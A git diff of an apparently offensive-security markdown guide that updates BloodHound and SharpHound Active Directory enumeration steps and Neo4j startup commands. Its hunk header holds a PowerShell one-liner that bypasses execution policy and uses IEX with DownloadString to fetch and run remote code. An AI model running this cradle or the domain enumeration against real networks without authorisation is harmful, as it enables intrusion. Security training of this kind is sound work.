@@ -9,16 +9,14 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘
 ```
 
 If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : https://github.com/BloodHoundAD/SharpHound and https://github.com/fox-it/BloodHound.py
-```markdown
+```bash
 python3 bloodhound.py -u XXX -dc DOMAIN -c all
-OR .\SharpHound.exe
 ```
 
-The tool give you a zip file, that you have to send to a Neo4j database. Start the Neo4j database :
+The tool give you a zip file, that you have to send to a Neo4j database. On Linux, install Neo4j and start the service :
 
-```markdown
-Import-Module .\Neo4j-Management.psd1
-Invoke-Neo4j console
+```bash
+sudo neo4j start
 ```
 
 Then execute BloodHound and import the zip file.
